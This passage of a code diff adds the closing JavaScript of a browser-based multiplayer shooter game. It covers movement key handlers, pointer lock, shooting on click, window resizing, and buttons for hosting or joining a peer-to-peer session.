+        if (e.key === 'a' || e.key === 'A') keys.a = false;
+        if (e.key === 's' || e.key === 'S') keys.s = false;
+        if (e.key === 'd' || e.key === 'D') keys.d = false;
+    });
+
+    renderer.domElement.addEventListener('click', () => {
+        if (isPlaying && !localDead) {
+            controls.lock();
+        }
+    });
+
+    renderer.domElement.addEventListener('mousedown', (e) => {
+        if (e.button === 0 && isPlaying && controls.isLocked) {
+            shoot();
+        }
+    });
+
+    function onResize() {
+        if (renderer) {
+            const w = window.innerWidth, h = window.innerHeight;
+            renderer.setSize(w, h);
+            camera.aspect = w / h;
+            camera.updateProjectionMatrix();
+        }
+    }
+
+    // --- UI button events ---
+    hostBtn.addEventListener('click', () => {
+        // Hide join area
+        joinArea.style.display = 'none';
+        // Start as host
+        startGame(true);
+    });
+
+    joinBtn.addEventListener('click', () => {
+        if (joinArea.style.display === 'flex') {
+            joinArea.style.display = 'none';
+        } else {
+            joinArea.style.display = 'flex';
+            peerIdInput.focus();
+        }
+    });
+
+    connectBtn.addEventListener('click', () => {
+        const id = peerIdInput.value.trim();
+        if (!id) return;
+        joinArea.style.display = 'none';
+        startGame(false, id);
+    });
+
+    // --- Initial setup (no scene yet) ---
+    // We'll create scene on first start.
+
+    // Handle disconnection from peer (e.g., browser close)
+    window.addEventListener('beforeunload', () => {
+        if (peer) peer.destroy();
+    });
+
+})();
+</script>
 </body>
 </html>
